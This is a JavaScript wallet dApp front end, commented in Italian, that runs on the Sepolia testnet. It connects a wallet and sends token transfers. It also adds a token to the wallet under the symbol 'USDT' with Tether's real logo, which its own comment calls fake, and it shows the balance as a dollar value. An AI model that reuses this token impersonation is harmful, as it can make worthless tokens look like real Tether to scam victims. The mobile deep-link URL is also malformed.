let provider;
let signer;
let account;
let usdt;

const USDT_ADDRESS = "0x1eB20Afd64393EbD94EB77FC59a6a24a07f8A93D";
const USDT_DECIMALS = 6;
const SEPOLIA_CHAIN_ID = "0xaa36a7"; // 11155111 in hex

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)"
];

// 1. Funzione per saltare dal browser all'App Wallet
function openInWallet() {
    const dappUrl = window.location.href.replace("https://", "");
    // Default: MetaMask Deep Link
    window.location.href = "metamask.app.link" + dappUrl;
}

// 2. Connessione Universale
async function connectWallet() {
  if (typeof window.ethereum === 'undefined') {
    alert("Per favore, apri questa pagina dal browser interno del tuo Wallet (MetaMask, Trust Wallet o Coinbase)");
    return;
  }

  try {
    // Inizializza Ethers v6 con il provider iniettato (qualsiasi esso sia)
    provider = new ethers.BrowserProvider(window.ethereum);
    
    // Richiesta Account
    const accs = await provider.send("eth_requestAccounts", []);
    account = accs[0];

    // Controllo e Switch Rete Automatico
    const network = await provider.getNetwork();
    const chainIdHex = "0x" + network.chainId.toString(16);

    if (chainIdHex !== SEPOLIA_CHAIN_ID) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: SEPOLIA_CHAIN_ID }]
        });
        // Ricarica per applicare il cambio
        window.location.reload();
      } catch (err) {
        if (err.code === 4902) {
            alert("Aggiungi la rete Sepolia al tuo wallet per continuare.");
        }
      }
    }

    signer = await provider.getSigner();
    
    // Aggiorna UI
    document.getElementById("wallet").innerText = account.slice(0, 6) + "..." + account.slice(-4);
    document.getElementById("status").innerText = "● Connesso (Sepolia)";
    document.getElementById("status").style.color = "#26a17b";
    document.getElementById("btnMobileOpen").style.display = "none";

    usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    updateUI();

  } catch (error) {
    console.error("Errore connessione:", error);
    alert("Connessione rifiutata.");
  }
}

// 3. Funzione per aggiungere il LOGO finto Tether al Wallet
async function addTokenToWallet() {
    if (!window.ethereum) return;
    try {
        await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
                type: 'ERC20',
                options: {
                    address: USDT_ADDRESS,
                    symbol: 'USDT', // Usiamo il nome reale per lo scopo didattico
                    decimals: USDT_DECIMALS,
                    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                },
            },
        });
    } catch (error) {
        console.error(error);
    }
}

async function updateUI() {
  if (!usdt || !account) return;
  const raw = await usdt.balanceOf(account);
  const balance = Number(ethers.formatUnits(raw, USDT_DECIMALS));

  document.getElementById("balance").innerText = balance.toLocaleString() + " USDT";
  document.getElementById("usdValue").innerText = "$" + balance.toLocaleString() + " USD";
}

async function sendUSDT() {
  const to = document.getElementById("to").value;
  const amount = document.getElementById("amount").value;

  if (!ethers.isAddress(to)) {
    alert("Indirizzo non valido");
    return;
  }

  try {
    const value = ethers.parseUnits(amount, USDT_DECIMALS);
    const tx = await usdt.transfer(to, value);
    alert("Transazione inviata! Attendi conferma...");
    await tx.wait();
    alert("✅ Invio completato!");
    updateUI();
  } catch (err) {
    alert("Errore durante l'invio. Verifica di avere abbastanza ETH per il gas.");
  }
}
